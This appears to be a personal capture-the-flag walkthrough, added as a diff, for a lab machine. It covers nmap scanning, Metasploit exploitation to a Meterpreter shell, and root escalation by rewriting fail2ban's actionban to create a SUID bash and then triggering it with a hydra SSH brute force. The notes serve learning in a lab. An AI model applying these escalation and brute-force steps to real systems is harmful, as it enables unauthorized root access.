@@ -1,0 +1,37 @@
+first used nmap command to find the website title - use nmap -A for extara info
+seearch metasploit for sites names
+exexute msfconsole to get meterpeter
+flag for user is in /home directory
+
+root is bit more complexed
+first we need to get active shell
+in meterpenter we write
+shell
+SHELL=/bin/bash script -q /dev/null --? from shell to bash
+
+used sudo -l for looking files i have premmison to
+found /usr/bin/fail2ban-client with ROOT permissions
+
+There you can find an approach to customize a config in the config directory and place code in 
+it that is to be executed with root permissions. Unfortunately, we only have read-only access to the directory...
+/etc/fail2ban
+
+
+we need to copy the .conf directory to have the option to change its contents
+
+
+sudo fail2ban-client -c /tmp/fail2ban/ -v restart --> change the path of the configuration directory for Fail2Ban service 
+rsync -av /etc/fail2ban/ /tmp/fail2ban/ --> we recursively copy the contents of /etc/fail2ban/ to /tmp/fail2ban/
+
+than we need to edit the file iptables-multiport.conf using nano:
+nano /etc/fail2ban/action.d/iptables-multiport.conf
+
+we need to find the line actionban = --> comment it out using # and add our malicious line
+actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash --> copy /bin/bash into /tmp and then give it SUID permissions.
+
+now we just need to restart the service using sudo and get 5 failed login attempts over ssh --> SSH since it’s open and the only service currently “protected” by Fail2Ban.
+
+we can use hydra: 
+hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://172.16.1.175
+
+now if we use /tmp/bash -p we gain root shell 
